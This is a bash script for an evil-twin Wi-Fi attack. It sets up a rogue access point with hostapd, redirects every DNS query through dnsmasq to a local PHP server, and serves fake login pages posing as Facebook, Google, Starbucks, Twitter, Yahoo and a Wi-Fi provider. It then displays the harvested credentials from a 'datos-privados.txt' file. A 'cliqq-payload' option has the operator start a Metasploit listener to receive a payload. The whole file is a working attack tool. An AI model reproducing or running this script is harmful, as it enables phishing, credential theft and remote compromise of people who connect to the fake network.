#!/bin/bash	

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
cleancolor="echo -e "${endColour}""

credentials() {
	hosts=0 
	tput civis
	while true; do
		echo -e "\n${greenColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$hosts${endColour}\n"
		find \-name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		hosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
		sleep 3; clear
	done
}

attack() {
	tput cnorm; echo -ne "\n${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
	echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
	tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 3
	echo -e "interface=${tar}\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$ch\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
	echo -e "\n$yellowColour[*]$grayColour Configuring interface $tar"
	sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 5
	echo -e "${yellowColour}[*]${grayColour} Configuring dnsmasq..."
	echo -e "interface=${tar}\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
	sleep 1
	ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 3
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	cd src
	logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi)
	tput cnorm
	echo -ne "\n${redColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo, cliqq-payload, optimumwifi): " && read usedlogin
	check_logins=0; for login in "${logins[@]}"; do
		if [ "$login" == "$usedlogin" ]; then
					check_logins=1
		fi
		
		done
			
		if [ "$usedlogin" == "cliqq-payload" ]; then
			check_logins=2
		fi
			
		if [ $check_logins -eq 1 ]; then
			tput civis; pushd $usedlogin > /dev/null 2>&1
			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
			php -S 192.168.1.1:80 > /dev/null 2>&1 &
			sleep 2
			popd > /dev/null 2>&1; credentials
		elif [ $check_logins -eq 2 ]; then
			tput civis; pushd $usedlogin > /dev/null 2>&1
			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
			php -S 192.168.1.1:80 > /dev/null 2>&1 &
			sleep 2
			echo -e "\n${yellowColour}[*]${grayColour} Configure from another console a Listener in Metasploit as follows: "
			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			cat msfconsole.rc
			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
			popd > /dev/null 2>&1; credentials
		else
			tput civis; echo -e "\n${yellowColour}[*]${grayColour} Using custom template..."; sleep 1
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
			pushd $usedlogin > /dev/null 2>&1
			php -S 192.168.1.1:80 > /dev/null 2>&1 
			popd > /dev/null 2>&1; credentials
		fi
		cd ..
}
	clear
	attack